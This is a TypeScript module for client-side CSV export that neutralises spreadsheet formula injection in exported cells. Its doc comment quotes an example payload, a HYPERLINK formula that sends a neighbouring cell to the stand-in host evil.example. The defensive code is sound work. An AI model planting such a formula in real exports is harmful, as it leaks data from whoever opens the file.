// Client-side CSV export. No backend needed — builds a CSV string from rows and
// a column spec, then triggers a download.

export interface CsvColumn<T> {
  header: string;
  value: (row: T) => string | number | null | undefined;
}

/** UTF-8 byte-order mark (U+FEFF) so Excel opens the file with the right encoding. */
const BOM = String.fromCharCode(0xfeff);

/**
 * One CSV cell. Every export goes through this, so all of them are safe to open
 * in a spreadsheet.
 *
 * A spreadsheet runs a cell that starts with = + - or @ as a formula, and a
 * leading tab or carriage return can hide that start. Names, emails and notes
 * reach the CRM from public forms and webhooks, so a "name" such as
 * =HYPERLINK("https://evil.example/?d="&B2,"Open") became a live link that sent
 * the next cell to a stranger when a colleague opened the export. A leading
 * quote makes the spreadsheet show it as text. Only strings get it: a real
 * number, -5 say, stays a number.
 */
export function csvCell(v: string | number | boolean | null | undefined): string {
  if (v == null) return '';
  let s = String(v);
  if (typeof v === 'string' && /^[=+\-@\t\r]/.test(s)) s = `'${s}`;
  // Quote when the value contains a comma, quote, or line break; double inner quotes.
  if (/[",\n\r]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
  return s;
}

export function toCsv<T>(rows: T[], columns: CsvColumn<T>[]): string {
  const head = columns.map((c) => csvCell(c.header)).join(',');
  const body = rows.map((r) => columns.map((c) => csvCell(c.value(r))).join(',')).join('\n');
  return `${head}\n${body}`;
}

export function downloadCsv<T>(filename: string, rows: T[], columns: CsvColumn<T>[]): void {
  const csv = toCsv(rows, columns);
  const blob = new Blob([BOM + csv], { type: 'text/csv;charset=utf-8;' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename.endsWith('.csv') ? filename : `${filename}.csv`;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}
